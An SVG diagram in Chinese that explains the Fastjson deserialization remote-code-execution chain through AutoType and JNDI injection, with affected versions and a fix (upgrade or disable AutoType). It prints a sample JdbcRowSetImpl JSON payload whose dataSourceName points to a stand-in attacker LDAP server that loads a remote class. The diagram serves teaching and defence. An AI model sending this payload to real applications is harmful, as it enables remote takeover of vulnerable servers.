<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 560" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <defs>
    <marker id="arr-f2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c0392b"/>
    </marker>
  </defs>
  <rect x="0" y="0" width="1200" height="560" fill="#f8fafc" rx="10"/>
  <text x="40" y="42" font-size="22" font-weight="bold" fill="#111">Fastjson 反序列化 RCE 攻击链路</text>
  <text x="40" y="64" font-size="14" fill="#666">JSON 反序列化 → Autotype 触发 Java 类加载 → JNDI 注入 → 远程代码执行</text>

  <rect x="30" y="160" width="200" height="90" rx="12" fill="#fee2e2" stroke="#c0392b" stroke-width="2.5"/>
  <text x="130" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🕵️ 攻击者</text>
  <text x="130" y="215" font-size="13" text-anchor="middle" fill="#555">构造恶意 JSON</text>

  <path d="M 230 205 L 270 205" stroke="#c0392b" stroke-width="2.5" fill="none" marker-end="url(#arr-f2)"/>

  <rect x="280" y="120" width="280" height="180" rx="12" fill="#dbeafe" stroke="#2980b9" stroke-width="2.5"/>
  <text x="420" y="150" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">📦 恶意 JSON Payload</text>
  <line x1="300" y1="160" x2="540" y2="160" stroke="#2980b9" stroke-width="1"/>
  <text x="300" y="188" font-size="12" fill="#333"><code>
{"@type":"com.sun.rowset
.JdbcRowSetImpl",
 "dataSourceName":
 "ldap://攻击机:1389/exp",
 "autoCommit":true}
</code></text>
  <text x="300" y="290" font-size="12" fill="#555" font-weight="bold">核心：@type 字段触发 Autotype</text>

  <path d="M 560 205 L 600 205" stroke="#2980b9" stroke-width="2.5" fill="none" marker-end="url(#arr-f2)"/>

  <rect x="610" y="160" width="200" height="90" rx="12" fill="#e8f5e9" stroke="#27ae60" stroke-width="2"/>
  <text x="710" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🖥️ Java 应用</text>
  <text x="710" y="215" font-size="13" text-anchor="middle" fill="#555">Fastjson 反序列化</text>

  <path d="M 810 205 L 850 205" stroke="#27ae60" stroke-width="2.5" fill="none" marker-end="url(#arr-f2)"/>

  <rect x="860" y="160" width="200" height="90" rx="12" fill="#fef9c3" stroke="#b45309" stroke-width="2"/>
  <text x="960" y="190" font-size="16" text-anchor="middle" fill="#111" font-weight="bold">🏛️ LDAP/RMI 服务端</text>
  <text x="960" y="215" font-size="13" text-anchor="middle" fill="#555">攻击者控制的 JNDI 服务</text>

  <path d="M 1060 205 C 1100 350, 350 380, 270 205" stroke="#b45309" stroke-width="2" stroke-dasharray="5,3" fill="none" marker-end="url(#arr-f2)"/>
  <text x="660" y="390" font-size="13" fill="#b45309" text-anchor="middle" font-weight="bold">JNDI Lookup → 远程加载恶意 Java 类 → RCE</text>

  <!-- 版本对应 -->
  <rect x="30" y="340" width="1130" height="200" rx="10" fill="#ffffff" stroke="#ddd" stroke-width="1"/>
  <text x="50" y="370" font-size="16" font-weight="bold" fill="#111">受影响版本</text>

  <text x="50" y="400" font-size="14" font-weight="bold" fill="#c0392b">Fastjson ≤ 1.2.24</text>
  <text x="260" y="400" font-size="13" fill="#333">默认开启 Autotype，直接可打</text>

  <text x="50" y="430" font-size="14" font-weight="bold" fill="#2980b9">Fastjson 1.2.25 ~ 1.2.41</text>
  <text x="260" y="430" font-size="13" fill="#333">需 Autotype 开启 + Feature.SupportAutoType 参数</text>

  <text x="50" y="460" font-size="14" font-weight="bold" fill="#27ae60">Fastjson ≤ 1.2.68</text>
  <text x="260" y="460" font-size="13" fill="#333">存在 bypass（黑名单绕过、classLoader 利用）</text>

  <text x="50" y="490" font-size="14" font-weight="bold" fill="#b45309">Fastjson ≥ 1.2.83</text>
  <text x="260" y="490" font-size="13" fill="#333">默认安全，需特定条件（AutoType + SafeMode 绕过）</text>

  <text x="50" y="520" font-size="14" font-weight="bold" fill="#111">修复</text>
  <text x="200" y="520" font-size="13" fill="#333">升级 fastjson ≥ 1.2.83 / 关闭 Autotype：ParserConfig.getGlobalInstance().setAutoTypeSupport(false)</text>
</svg>
